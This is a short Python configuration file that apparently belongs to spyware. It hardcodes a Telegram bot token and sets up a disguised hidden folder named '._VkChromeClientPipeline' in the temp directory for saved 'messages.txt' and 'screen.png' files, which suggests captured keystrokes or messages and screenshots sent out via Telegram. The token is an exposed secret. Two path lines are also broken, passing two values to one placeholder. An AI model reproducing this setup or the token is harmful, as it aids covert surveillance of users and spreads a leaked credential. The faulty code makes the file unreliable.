import os
from tempfile import gettempdir

TELEGRAM_TOKEN = '5398930017:AAGzaYfcZhulbTm1-nONyBcqhhJUHGBwzxo'
_PATH_COMMON_PART = '%s/._VkChromeClientPipeline/saved' % gettempdir()
PHRASES_FILE_PATH = '%s/messages.txt' % (gettempdir(), _PATH_COMMON_PART)
SCREEN_FILE_PATH = '%s/screen.png' % (gettempdir(), _PATH_COMMON_PART)